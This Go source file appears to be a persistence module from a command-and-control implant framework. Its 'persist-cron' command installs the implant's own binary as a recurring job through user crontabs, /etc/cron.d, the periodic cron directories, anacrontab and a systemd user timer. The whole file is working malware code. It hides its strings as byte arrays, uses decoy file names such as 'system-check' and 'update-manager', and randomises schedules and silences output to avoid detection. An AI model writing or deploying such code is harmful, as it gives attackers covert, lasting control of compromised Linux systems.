// server/docker/payloads/Linux/action_cron_persistence_linux.go

//go:build linux
// +build linux

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/unix"
)

// Cron persistence strings - short flags transformed by server
var (
	// Command name
	cronCmdName = string([]byte{0x70, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74, 0x2d, 0x63, 0x72, 0x6f, 0x6e}) // persist-cron

	// Actions
	cronActionAdd    = string([]byte{0x61, 0x64, 0x64})                   // add
	cronActionRemove = string([]byte{0x72, 0x65, 0x6d, 0x6f, 0x76, 0x65}) // remove
	cronActionList   = string([]byte{0x6c, 0x69, 0x73, 0x74})             // list

	// Short flags (transformed from user-friendly flags on server side)
	cronFlagMethod   = string([]byte{0x2d, 0x6d}) // -m (from --method)
	cronFlagUser     = string([]byte{0x2d, 0x39}) // -9 (from --user)
	cronFlagInterval = string([]byte{0x2d, 0x69}) // -i (from --interval)
	cronFlagCommand  = string([]byte{0x2d, 0x36}) // -6 (from --command)

	// Methods
	cronMethodSpool    = string([]byte{0x73, 0x70, 0x6f, 0x6f, 0x6c})                   // spool
	cronMethodCrond    = string([]byte{0x63, 0x72, 0x6f, 0x6e, 0x64})                   // crond
	cronMethodPeriodic = string([]byte{0x70, 0x65, 0x72, 0x69, 0x6f, 0x64, 0x69, 0x63}) // periodic
	cronMethodAnacron  = string([]byte{0x61, 0x6e, 0x61, 0x63, 0x72, 0x6f, 0x6e})       // anacron
	cronMethodTimer    = string([]byte{0x74, 0x69, 0x6d, 0x65, 0x72})                   // timer (systemd user timer, no root)
	cronMethodAll      = string([]byte{0x61, 0x6c, 0x6c})                               // all

	// Fallback constants (used if no template data provided)
	cronProcSelfExe = string([]byte{0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x65, 0x6c, 0x66, 0x2f, 0x65, 0x78, 0x65}) // /proc/self/exe
)

// CronTemplate holds server-provided template data
type CronTemplate struct {
	Version   int               `json:"v"`
	Type      string            `json:"t"`
	Templates map[string]string `json:"tpl"`
	Params    map[string]string `json:"p"`
}

// Template keys (matching server-side constants)
const (
	tplCronShebang       = "cron_shebang"
	tplCronComment       = "cron_comment"
	tplCronDevNull       = "cron_devnull"
	tplCronMaintHeader   = "cron_maint_hdr"
	tplCronShellBash     = "cron_shell"
	tplCronPathEnv       = "cron_path"
	tplCronEtcCronD      = "cron_etc_d"
	tplCronEtcAnacrontab = "cron_anacrontab"
	tplCronEtcHourly     = "cron_etc_hourly"
	tplCronEtcDaily      = "cron_etc_daily"
	tplCronEtcWeekly     = "cron_etc_weekly"
	tplCronEtcMonthly    = "cron_etc_monthly"
	tplCronSpoolCrontabs = "cron_spool_crontabs"
	tplCronSpoolCron     = "cron_spool_cron"
	tplCronSpoolTabs     = "cron_spool_tabs"
	tplCronFileCheck     = "cron_file_check"
	tplCronFileUpdate    = "cron_file_update"
	tplCronFileMaint     = "cron_file_maint"
	tplCronIntHourly     = "cron_int_hourly"
	tplCronIntDaily      = "cron_int_daily"
	tplCronIntWeekly     = "cron_int_weekly"
	tplCronIntMonthly    = "cron_int_monthly"
	tplCronIntReboot     = "cron_int_reboot"

	// Systemd user timer keys
	tplTimerUserDir     = "timer_user_dir"
	tplTimerHeader      = "timer_header"
	tplTimerOnCalendar  = "timer_on_calendar"
	tplTimerOnBootSec   = "timer_on_boot_sec"
	tplTimerOnUnitSec   = "timer_on_unit_sec"
	tplTimerPersistent  = "timer_persistent"
	tplTimerExt         = "timer_ext"
	tplTimerDefaultName = "timer_default_name"
)

// Fallback values (used when no template provided)
var cronFallback = map[string]string{
	tplCronShebang:       "#!/bin/bash",
	tplCronComment:       "# Added by system at",
	tplCronDevNull:       ">/dev/null 2>&1",
	tplCronMaintHeader:   "# System maintenance task",
	tplCronShellBash:     "SHELL=/bin/bash",
	tplCronPathEnv:       "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin",
	tplCronEtcCronD:      "/etc/cron.d",
	tplCronEtcAnacrontab: "/etc/anacrontab",
	tplCronEtcHourly:     "/etc/cron.hourly",
	tplCronEtcDaily:      "/etc/cron.daily",
	tplCronEtcWeekly:     "/etc/cron.weekly",
	tplCronEtcMonthly:    "/etc/cron.monthly",
	tplCronSpoolCrontabs: "/var/spool/cron/crontabs/%s",
	tplCronSpoolCron:     "/var/spool/cron/%s",
	tplCronSpoolTabs:     "/var/spool/cron/tabs/%s",
	tplCronFileCheck:     "system-check",
	tplCronFileUpdate:    "system-update",
	tplCronFileMaint:     "system-maint",
	tplCronIntHourly:     "@hourly",
	tplCronIntDaily:      "@daily",
	tplCronIntWeekly:     "@weekly",
	tplCronIntMonthly:    "@monthly",
	tplCronIntReboot:     "@reboot",
	// Systemd user timer fallbacks
	tplTimerUserDir:     ".config/systemd/user",
	tplTimerHeader:      "[Timer]",
	tplTimerOnCalendar:  "OnCalendar=",
	tplTimerOnBootSec:   "OnBootSec=",
	tplTimerOnUnitSec:   "OnUnitActiveSec=",
	tplTimerPersistent:  "Persistent=true",
	tplTimerExt:         ".timer",
	tplTimerDefaultName: "update-manager",
}

// CronPersistenceCommand handles cron-based persistence
type CronPersistenceCommand struct {
	tpl *CronTemplate // Parsed template from server (nil if not provided)
}

// getTpl returns template value or fallback
func (c *CronPersistenceCommand) getTpl(key string) string {
	if c.tpl != nil && c.tpl.Templates != nil {
		if val, ok := c.tpl.Templates[key]; ok {
			return val
		}
	}
	// Fallback to hardcoded value
	if val, ok := cronFallback[key]; ok {
		return val
	}
	return ""
}

func (c *CronPersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Parse template from Command.Data if provided
	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data); err == nil {
			var tpl CronTemplate
			if err := json.Unmarshal(decoded, &tpl); err == nil {
				c.tpl = &tpl
			}
		}
	}

	// Default to add if no args or first arg is a flag
	if len(args) == 0 {
		return c.addCronPersistence(args)
	}

	action := args[0]

	// If first arg starts with '-', it's a flag not an action - default to add
	if strings.HasPrefix(action, "-") {
		return c.addCronPersistence(args)
	}

	switch action {
	case cronActionAdd:
		return c.addCronPersistence(args[1:])
	case cronActionRemove:
		return c.removeCronPersistence(args[1:])
	case cronActionList:
		return c.listCronPersistence()
	default:
		// Unknown action - treat as flags for add
		return c.addCronPersistence(args)
	}
}

// addCronPersistence adds cron job via selected method(s)
func (c *CronPersistenceCommand) addCronPersistence(args []string) CommandResult {
	var targetUser string
	var interval string
	var command string
	var method string = cronMethodAll // Default to all methods

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case cronFlagMethod:
			if i+1 < len(args) {
				method = args[i+1]
				i++
			}
		case cronFlagUser:
			if i+1 < len(args) {
				targetUser = args[i+1]
				i++
			}
		case cronFlagInterval:
			if i+1 < len(args) {
				interval = args[i+1]
				i++
			}
		case cronFlagCommand:
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		}
	}

	// Defaults
	if targetUser == "" {
		currentUser, err := user.Current()
		if err != nil {
			return CommandResult{
				Output:   Err(E19),
				ExitCode: 1,
			}
		}
		targetUser = currentUser.Username
	}

	if interval == "" {
		interval = c.getTpl(tplCronIntHourly)
	}

	if command == "" {
		execPath, err := os.Readlink(cronProcSelfExe)
		if err != nil {
			execPath = os.Args[0]
		}
		command = execPath
	}

	var results []string

	// Execute based on selected method
	switch method {
	case cronMethodSpool:
		if result := c.addViaSpoolCron(targetUser, interval, command); result != "" {
			results = append(results, result)
		}
	case cronMethodCrond:
		if result := c.addViaCronD(targetUser, interval, command); result != "" {
			results = append(results, result)
		}
	case cronMethodPeriodic:
		if result := c.addViaCronDirectories(command, interval); result != "" {
			results = append(results, result)
		}
	case cronMethodAnacron:
		if result := c.addViaAnacron(command); result != "" {
			results = append(results, result)
		}
	case cronMethodTimer:
		// Systemd user timer - works without root
		if result := c.addViaSystemdTimer(interval, command); result != "" {
			results = append(results, result)
		}
	case cronMethodAll:
		// Try all methods (timer first since it doesn't need root)
		if result := c.addViaSystemdTimer(interval, command); result != "" {
			results = append(results, result)
		}
		if result := c.addViaSpoolCron(targetUser, interval, command); result != "" {
			results = append(results, result)
		}
		if result := c.addViaCronD(targetUser, interval, command); result != "" {
			results = append(results, result)
		}
		if result := c.addViaCronDirectories(command, interval); result != "" {
			results = append(results, result)
		}
		if result := c.addViaAnacron(command); result != "" {
			results = append(results, result)
		}
	default:
		return CommandResult{
			Output:   ErrCtx(E21, method),
			ExitCode: 1,
		}
	}

	if len(results) == 0 {
		return CommandResult{
			Output:   ErrCtx(E11, method),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// addViaSpoolCron adds to user's crontab file directly
func (c *CronPersistenceCommand) addViaSpoolCron(username, interval, command string) string {
	// Paths where crontabs are typically stored
	cronPaths := []string{
		fmt.Sprintf(c.getTpl(tplCronSpoolCrontabs), username),
		fmt.Sprintf(c.getTpl(tplCronSpoolCron), username),
		fmt.Sprintf(c.getTpl(tplCronSpoolTabs), username),
	}

	for _, cronPath := range cronPaths {
		// Check if parent directory exists
		parentDir := filepath.Dir(cronPath)
		if _, err := os.Stat(parentDir); os.IsNotExist(err) {
			continue
		}

		// Check write permissions using unix.Access
		if unix.Access(parentDir, unix.W_OK) != nil {
			continue
		}

		// Generate cron entry
		cronEntry := c.generateCronEntry(interval, command)

		// Read existing crontab (if exists)
		var existingContent []byte
		if content, err := os.ReadFile(cronPath); err == nil {
			existingContent = content
			// Check if already added
			if strings.Contains(string(content), command) {
				return ErrCtx(E5, cronPath)
			}
		}

		// Append new entry
		newContent := append(existingContent, []byte("\n"+cronEntry+"\n")...)

		// Write back
		if err := os.WriteFile(cronPath, newContent, 0600); err == nil {
			return SuccCtx(S1, cronPath)
		}
	}

	return ""
}

// addViaCronD adds job to /etc/cron.d/
func (c *CronPersistenceCommand) addViaCronD(username, interval, command string) string {
	cronDDir := c.getTpl(tplCronEtcCronD)

	// Check if directory exists and is writable using unix.Access
	if unix.Access(cronDDir, unix.W_OK) != nil {
		return ""
	}

	// Generate filename (looks legitimate)
	filename := filepath.Join(cronDDir, c.getTpl(tplCronFileCheck))

	// Generate content
	cronContent := fmt.Sprintf("%s\n%s\n%s\n\n%s %s %s\n",
		c.getTpl(tplCronMaintHeader), c.getTpl(tplCronShellBash), c.getTpl(tplCronPathEnv),
		c.convertInterval(interval), username, command)

	// Write file
	if err := os.WriteFile(filename, []byte(cronContent), 0644); err == nil {
		return SuccCtx(S1, filename)
	}

	return ""
}

// addViaCronDirectories adds to /etc/cron.{hourly,daily,weekly,monthly}
func (c *CronPersistenceCommand) addViaCronDirectories(command, interval string) string {
	// Map intervals to directories
	dirMap := map[string]string{
		c.getTpl(tplCronIntHourly):  c.getTpl(tplCronEtcHourly),
		c.getTpl(tplCronIntDaily):   c.getTpl(tplCronEtcDaily),
		c.getTpl(tplCronIntWeekly):  c.getTpl(tplCronEtcWeekly),
		c.getTpl(tplCronIntMonthly): c.getTpl(tplCronEtcMonthly),
	}

	var targetDir string
	for key, dir := range dirMap {
		if strings.Contains(interval, key) {
			targetDir = dir
			break
		}
	}

	// Default to hourly if no match
	if targetDir == "" {
		targetDir = c.getTpl(tplCronEtcHourly)
	}

	// Check if directory exists and is writable using unix.Access
	if unix.Access(targetDir, unix.W_OK) != nil {
		return ""
	}

	// Create script file
	scriptName := filepath.Join(targetDir, c.getTpl(tplCronFileUpdate))
	scriptContent := fmt.Sprintf("%s\n%s\n", c.getTpl(tplCronShebang), command)

	if err := os.WriteFile(scriptName, []byte(scriptContent), 0755); err == nil {
		return SuccCtx(S1, scriptName)
	}

	return ""
}

// addViaAnacron adds anacron job for systems that don't run 24/7
func (c *CronPersistenceCommand) addViaAnacron(command string) string {
	anacronTab := c.getTpl(tplCronEtcAnacrontab)

	// Check if anacrontab exists and is writable using unix.Access
	if unix.Access(anacronTab, unix.W_OK) != nil {
		return ""
	}

	// Read existing content
	content, err := os.ReadFile(anacronTab)
	if err != nil {
		return ""
	}

	// Check if already added
	if strings.Contains(string(content), command) {
		return Err(E5)
	}

	// Add anacron entry (runs daily with 5 minute delay)
	anacronEntry := fmt.Sprintf("\n1\t5\t%s\t%s\n", c.getTpl(tplCronFileMaint), command)
	newContent := append(content, []byte(anacronEntry)...)

	if err := os.WriteFile(anacronTab, newContent, 0644); err == nil {
		return SuccCtx(S1, anacronTab)
	}

	return ""
}

// addViaSystemdTimer creates a systemd user timer (no root required)
// Uses ~/.config/systemd/user/ directory which is user-writable
func (c *CronPersistenceCommand) addViaSystemdTimer(interval, command string) string {
	// Get user home directory
	currentUser, err := user.Current()
	if err != nil {
		return ""
	}

	// Build path to user systemd directory
	userDir := filepath.Join(currentUser.HomeDir, c.getTpl(tplTimerUserDir))

	// Create directory if it doesn't exist
	if err := os.MkdirAll(userDir, 0755); err != nil {
		return ""
	}

	// Generate service/timer name
	timerName := c.getTpl(tplTimerDefaultName)
	serviceFile := filepath.Join(userDir, timerName+".service")
	timerFile := filepath.Join(userDir, timerName+c.getTpl(tplTimerExt))

	// Check if already exists
	if _, err := os.Stat(timerFile); err == nil {
		return ErrCtx(E5, timerFile)
	}

	// Generate the service unit file (reuse systemd templates from persist systemd)
	serviceContent := fmt.Sprintf(`[Unit]
Description=User Update Manager

[Service]
Type=oneshot
ExecStart=%s
StandardOutput=null
StandardError=null
`, command)

	// Generate timer unit file
	timerContent := c.generateTimerUnit(interval)

	// Write service file
	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
		return ""
	}

	// Write timer file
	if err := os.WriteFile(timerFile, []byte(timerContent), 0644); err != nil {
		// Clean up service file if timer write fails
		os.Remove(serviceFile)
		return ""
	}

	return SuccCtx(S1, timerFile)
}

// generateTimerUnit creates a systemd timer unit file content
func (c *CronPersistenceCommand) generateTimerUnit(interval string) string {
	var timerSpec string

	// Convert cron-style intervals to systemd OnCalendar format
	switch interval {
	case c.getTpl(tplCronIntHourly), "@hourly":
		timerSpec = c.getTpl(tplTimerOnCalendar) + "hourly"
	case c.getTpl(tplCronIntDaily), "@daily":
		timerSpec = c.getTpl(tplTimerOnCalendar) + "daily"
	case c.getTpl(tplCronIntWeekly), "@weekly":
		timerSpec = c.getTpl(tplTimerOnCalendar) + "weekly"
	case c.getTpl(tplCronIntMonthly), "@monthly":
		timerSpec = c.getTpl(tplTimerOnCalendar) + "monthly"
	case c.getTpl(tplCronIntReboot), "@reboot":
		// For reboot, use OnBootSec
		timerSpec = c.getTpl(tplTimerOnBootSec) + "1min"
	default:
		// Assume it's a cron expression - convert to OnCalendar
		// For now, default to hourly if unknown format
		timerSpec = c.getTpl(tplTimerOnCalendar) + "hourly"
	}

	timerName := c.getTpl(tplTimerDefaultName)

	return fmt.Sprintf(`[Unit]
Description=User Update Manager Timer

%s
%s
%s
Unit=%s.service

[Install]
WantedBy=timers.target
`, c.getTpl(tplTimerHeader), timerSpec, c.getTpl(tplTimerPersistent), timerName)
}

// generateCronEntry creates a cron entry
func (c *CronPersistenceCommand) generateCronEntry(interval, command string) string {
	// Add some randomization to avoid detection
	comment := fmt.Sprintf("%s %s", c.getTpl(tplCronComment), time.Now().Format("2006-01-02"))

	// Convert special intervals
	cronTime := c.convertInterval(interval)

	// Add output redirection to avoid cron emails
	return fmt.Sprintf("%s\n%s %s %s", comment, cronTime, command, c.getTpl(tplCronDevNull))
}

// convertInterval converts special intervals to cron format
func (c *CronPersistenceCommand) convertInterval(interval string) string {
	switch interval {
	case c.getTpl(tplCronIntHourly):
		// Add some randomization (0-59 minutes)
		return fmt.Sprintf("%d * * * *", time.Now().Unix()%60)
	case c.getTpl(tplCronIntDaily):
		return fmt.Sprintf("%d %d * * *", time.Now().Unix()%60, time.Now().Unix()%24)
	case c.getTpl(tplCronIntWeekly):
		return fmt.Sprintf("%d %d * * %d", time.Now().Unix()%60, time.Now().Unix()%24, time.Now().Unix()%7)
	case c.getTpl(tplCronIntMonthly):
		return fmt.Sprintf("%d %d %d * *", time.Now().Unix()%60, time.Now().Unix()%24, (time.Now().Unix()%28)+1)
	case c.getTpl(tplCronIntReboot):
		return c.getTpl(tplCronIntReboot)
	default:
		// Assume it's already in cron format
		return interval
	}
}

// removeCronPersistence removes cron persistence
func (c *CronPersistenceCommand) removeCronPersistence(args []string) CommandResult {
	var targetUser string
	var method string = cronMethodAll // Default to removing all

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case cronFlagMethod:
			if i+1 < len(args) {
				method = args[i+1]
				i++
			}
		case cronFlagUser:
			if i+1 < len(args) {
				targetUser = args[i+1]
				i++
			}
		}
	}

	if targetUser == "" {
		currentUser, _ := user.Current()
		if currentUser != nil {
			targetUser = currentUser.Username
		}
	}

	var results []string

	switch method {
	case cronMethodSpool:
		// Remove from user crontabs
		cronPaths := []string{
			fmt.Sprintf(c.getTpl(tplCronSpoolCrontabs), targetUser),
			fmt.Sprintf(c.getTpl(tplCronSpoolCron), targetUser),
			fmt.Sprintf(c.getTpl(tplCronSpoolTabs), targetUser),
		}
		for _, cronPath := range cronPaths {
			if err := c.cleanCronFile(cronPath); err == nil {
				results = append(results, SuccCtx(S2, cronPath))
			}
		}

	case cronMethodCrond:
		// Remove from /etc/cron.d/
		cronDFile := filepath.Join(c.getTpl(tplCronEtcCronD), c.getTpl(tplCronFileCheck))
		if err := os.Remove(cronDFile); err == nil {
			results = append(results, SuccCtx(S2, cronDFile))
		}

	case cronMethodPeriodic:
		// Remove from cron directories
		for _, dir := range []string{c.getTpl(tplCronEtcHourly), c.getTpl(tplCronEtcDaily), c.getTpl(tplCronEtcWeekly), c.getTpl(tplCronEtcMonthly)} {
			scriptPath := filepath.Join(dir, c.getTpl(tplCronFileUpdate))
			if err := os.Remove(scriptPath); err == nil {
				results = append(results, SuccCtx(S2, scriptPath))
			}
		}

	case cronMethodAnacron:
		// Clean anacrontab
		if err := c.cleanAnacron(); err == nil {
			results = append(results, SuccCtx(S2, c.getTpl(tplCronEtcAnacrontab)))
		}

	case cronMethodTimer:
		// Remove systemd user timer
		if removed := c.removeSystemdTimer(); len(removed) > 0 {
			results = append(results, removed...)
		}

	case cronMethodAll:
		// Remove from all locations
		cronPaths := []string{
			fmt.Sprintf(c.getTpl(tplCronSpoolCrontabs), targetUser),
			fmt.Sprintf(c.getTpl(tplCronSpoolCron), targetUser),
			fmt.Sprintf(c.getTpl(tplCronSpoolTabs), targetUser),
		}
		for _, cronPath := range cronPaths {
			if err := c.cleanCronFile(cronPath); err == nil {
				results = append(results, SuccCtx(S2, cronPath))
			}
		}

		cronDFile := filepath.Join(c.getTpl(tplCronEtcCronD), c.getTpl(tplCronFileCheck))
		os.Remove(cronDFile)

		for _, dir := range []string{c.getTpl(tplCronEtcHourly), c.getTpl(tplCronEtcDaily), c.getTpl(tplCronEtcWeekly), c.getTpl(tplCronEtcMonthly)} {
			scriptPath := filepath.Join(dir, c.getTpl(tplCronFileUpdate))
			if err := os.Remove(scriptPath); err == nil {
				results = append(results, SuccCtx(S2, scriptPath))
			}
		}

		if err := c.cleanAnacron(); err == nil {
			results = append(results, SuccCtx(S2, c.getTpl(tplCronEtcAnacrontab)))
		}

		// Also remove systemd user timer
		if removed := c.removeSystemdTimer(); len(removed) > 0 {
			results = append(results, removed...)
		}

	default:
		return CommandResult{
			Output:   ErrCtx(E21, method),
			ExitCode: 1,
		}
	}

	if len(results) == 0 {
		return CommandResult{
			Output:   ErrCtx(E4, method),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// cleanCronFile removes our entries from a cron file
func (c *CronPersistenceCommand) cleanCronFile(filePath string) error {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	lines := strings.Split(string(content), "\n")
	var cleanedLines []string
	skipNext := false

	// Get detection pattern from template (or fallback) - trim the "# " prefix
	comment := c.getTpl(tplCronComment)
	detectPattern := strings.TrimPrefix(comment, "# ")

	for _, line := range lines {
		// Skip our comments and associated cron lines
		if strings.Contains(line, detectPattern) {
			skipNext = true
			continue
		}
		if skipNext {
			skipNext = false
			continue
		}
		cleanedLines = append(cleanedLines, line)
	}

	return os.WriteFile(filePath, []byte(strings.Join(cleanedLines, "\n")), 0600)
}

// cleanAnacron removes our anacron entries
func (c *CronPersistenceCommand) cleanAnacron() error {
	anacronPath := c.getTpl(tplCronEtcAnacrontab)
	content, err := os.ReadFile(anacronPath)
	if err != nil {
		return err
	}

	lines := strings.Split(string(content), "\n")
	var cleanedLines []string
	fileMaint := c.getTpl(tplCronFileMaint)

	for _, line := range lines {
		if !strings.Contains(line, fileMaint) {
			cleanedLines = append(cleanedLines, line)
		}
	}

	return os.WriteFile(anacronPath, []byte(strings.Join(cleanedLines, "\n")), 0644)
}

// removeSystemdTimer removes systemd user timer files
func (c *CronPersistenceCommand) removeSystemdTimer() []string {
	var results []string

	currentUser, err := user.Current()
	if err != nil {
		return results
	}

	userDir := filepath.Join(currentUser.HomeDir, c.getTpl(tplTimerUserDir))
	timerName := c.getTpl(tplTimerDefaultName)

	serviceFile := filepath.Join(userDir, timerName+".service")
	timerFile := filepath.Join(userDir, timerName+c.getTpl(tplTimerExt))

	// Remove timer file
	if err := os.Remove(timerFile); err == nil {
		results = append(results, SuccCtx(S2, timerFile))
	}

	// Remove service file
	if err := os.Remove(serviceFile); err == nil {
		results = append(results, SuccCtx(S2, serviceFile))
	}

	return results
}

// listCronPersistence lists all found cron persistence
func (c *CronPersistenceCommand) listCronPersistence() CommandResult {
	var results []string

	// Get detection pattern from template (or fallback) - trim the "# " prefix
	comment := c.getTpl(tplCronComment)
	detectPattern := strings.TrimPrefix(comment, "# ")

	// Check user crontabs
	currentUser, _ := user.Current()
	if currentUser != nil {
		cronPaths := []string{
			fmt.Sprintf(c.getTpl(tplCronSpoolCrontabs), currentUser.Username),
			fmt.Sprintf(c.getTpl(tplCronSpoolCron), currentUser.Username),
		}

		for _, path := range cronPaths {
			if content, err := os.ReadFile(path); err == nil {
				if strings.Contains(string(content), detectPattern) {
					results = append(results, SuccCtx(S6, path))
				}
			}
		}
	}

	// Check /etc/cron.d/
	cronDFile := filepath.Join(c.getTpl(tplCronEtcCronD), c.getTpl(tplCronFileCheck))
	if _, err := os.Stat(cronDFile); err == nil {
		results = append(results, SuccCtx(S6, cronDFile))
	}

	// Check cron directories
	for _, dir := range []string{c.getTpl(tplCronEtcHourly), c.getTpl(tplCronEtcDaily), c.getTpl(tplCronEtcWeekly), c.getTpl(tplCronEtcMonthly)} {
		scriptPath := filepath.Join(dir, c.getTpl(tplCronFileUpdate))
		if _, err := os.Stat(scriptPath); err == nil {
			results = append(results, SuccCtx(S6, scriptPath))
		}
	}

	// Check anacrontab
	anacronPath := c.getTpl(tplCronEtcAnacrontab)
	if content, err := os.ReadFile(anacronPath); err == nil {
		if strings.Contains(string(content), c.getTpl(tplCronFileMaint)) {
			results = append(results, SuccCtx(S6, anacronPath))
		}
	}

	// Check systemd user timer
	if currentUser != nil {
		userDir := filepath.Join(currentUser.HomeDir, c.getTpl(tplTimerUserDir))
		timerName := c.getTpl(tplTimerDefaultName)
		timerFile := filepath.Join(userDir, timerName+c.getTpl(tplTimerExt))
		if _, err := os.Stat(timerFile); err == nil {
			results = append(results, SuccCtx(S6, timerFile))
		}
	}

	if len(results) == 0 {
		return CommandResult{
			Output:   Err(E4),
			ExitCode: 0,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}
